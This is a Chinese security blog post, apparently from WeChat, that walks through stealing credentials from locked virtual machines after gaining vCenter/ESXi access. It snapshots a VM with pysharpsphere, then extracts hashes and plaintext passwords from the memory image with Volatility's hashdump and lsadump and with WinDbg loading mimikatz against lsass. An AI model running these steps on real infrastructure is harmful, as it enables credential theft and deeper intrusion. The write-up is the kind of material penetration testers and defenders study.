<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DbXxm6vWgtL8uGjO_z-ocA)

![](https://mmbiz.qpic.cn/mmbiz_png/QJy6tNicmawKTt91v7IX7OjCWfQSyHtIoPPlNugcTo02xCGPTABGWO3JzooTZVnTF6N5j8ZwibjBVcxiaQUibhWjiaA/640)

**VCenter 获得锁屏机器 Hash 之内存快照抓取 Hash**

**内存快照抓 hash**

    在很多情况下，当我们拿到 VCenter 或 ESXI 服务器权限和 Web 后台权限登录后，发现很多重要的系统锁屏了，想要进入还需要输入密 码。因此，这时我们就需要抓取处于锁屏状态机器的 Hash 了。以下介绍使用内存快照抓取 Hash。

    使用 pysharpsphere 或 SharpSphere 对指定目标机器拍摄快照，然后 dump 镜像到本地。

#dump MoID 为 vm-59 的机器镜像到本地

```
pysharpsphere -H 192.168.106.14 -u administrator@vsphere.local -p "P@ssword1234" dump -t vm-59
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f0p8NgRKpm1YRBjcd72Z7MquSEBTsBownR9micUglVBfabAftbb4tPjTenZgI5WpdMsvVcI5VUl8A/640)

**Volatility 读取内存**

目标机器快照镜像 dump 到本地后，可以使用 Volatility 直接对. vmem 文件进行内存密码抓取。

如下命令获取镜像信息：

./volatility_2.6_mac64_standalone -f Win7-Snapshot2.vmem imageinfo

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f0p8NgRKpm1YRBjcd72Z7MsDCOq0cndV3ibKHgLDOVzjXian6y9y0H4kgaThiaoSZyOXmV1aHfTmNtg/640)

如下命令抓取哈希或明文密码：

#抓取哈希

```
./volatility_2.6_mac64_standalone -f Win7-Snapshot2.vmem --profile=Win7SP1x64 hashdump
```

#抓取明文密码

```
./volatility_2.6_mac64_standalone -f Win7-Snapshot2.vmem --profile=Win7SP1x64 lsadump
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f0p8NgRKpm1YRBjcd72Z7MghTbMH3OauqqheZHwT4eO5V36bfhQ9RAPwFK0licwrOWPrYvVBicA4gw/640)

**windbg 读取内存**

也可以使用 windbg 进行读取。首先使用 Bin2Dmp 执行如下命令将该内存文件转成 dmp 文件，如下转成 win7.dmp 文件。

```
Bin2Dmp.exe Win7-Snapshot2.vmem win7.dmp
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f0p8NgRKpm1YRBjcd72Z7M71c2ueZqia1WaLl3n3Xxp6n5IOstj4k2x09d0VYeuNVvz9LL83HrG2A/640)

然后使用 windbg 载入 win7.dmp 文件，如下。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f0p8NgRKpm1YRBjcd72Z7MhWACffB6BhGheoyr4gxV9MkibRc6kjmpKoBibKxKcWRPicASv5qRnRHkg/640)

接着在 kd> 中输入下面的命令

#设置符号路径

.symfix   

#重新载入

.reload     

#加载 mimilib.dll 路径

.load  D:\mimikatz\x64\mimilib.dll   

#查找 lsass 进程，并将该进程转到本机环境中

!process 0 0 lsass.exe

#这里的 fffffa80035c4b30 是上一步查找 lsass 进程的地址，注意替换

.process /r /p fffffa80035c4b30   

#载入 mimikatz，读取密码

!mimikatz

最后读取出密码如下。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f0p8NgRKpm1YRBjcd72Z7Mia0bJDmZQpbiampKXHKk4mTM2RXxwhcEhva6vL0XFXowJbFbs2ZGvTVA/640)

  

  ![](https://mmbiz.qpic.cn/mmbiz_png/4CNV4NImEQzOWHXrMsua6oKpUwDnUVmUGM5M8rU1euR9tcIWPIy5TFVKicGwLxvFYU0GfmFqxCMG1nwILNhwGpA/640)

相关：[ESXI 环境搭建和配置](http://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247490513&idx=1&sn=1ee7a3f5b3c1cd430fc85cd04da4722c&chksm=eaad9becddda12fa649e82438a1694b6e54d05a8f406b54b811559ee9c58316a005a573b47f8&scene=21#wechat_redirect)

         [VCenter 环境搭建和配置](http://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247490635&idx=1&sn=81d86ff146e5b9d2a812d3cc360863f4&chksm=eaad9c76ddda1560151f61afd1d54b71b8e07908db4deab675964c3ad6a663f0e1db69812e78&scene=21#wechat_redirect)

[VCenter 获得锁屏机器 Hash 之挂载 VMDK](http://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247490950&idx=1&sn=462fc5c647764ae0463e3d1d93d152e1&chksm=eaad9dbbddda14ad8a6905570a12bb46df7be0156706c2f61dbb0572c2a674de4e37321f88b4&scene=21#wechat_redirect)  

[VCenter 获得锁屏机器 Hash 之 KonBoot 引导](http://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247490788&idx=1&sn=0bf64b4ad055e08984ed52f726e617aa&chksm=eaad9cd9ddda15cf53fd72a7950b2004900a7d37c3c3eb870bc3e7974a18174d05dccef3d316&scene=21#wechat_redirect)  

可以在星球里跟我讨论交流。星球里有一千六百多位同样爱好安全技术的小伙伴一起交流！

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2fxJn63VMBmL43rqSCxJrQ5dMGm3rraggzib1Xhc3xjbcTFbbSNXKDgE4C0ibRBLaZBDPZTay51JICw/640?wx_fmt=jpeg)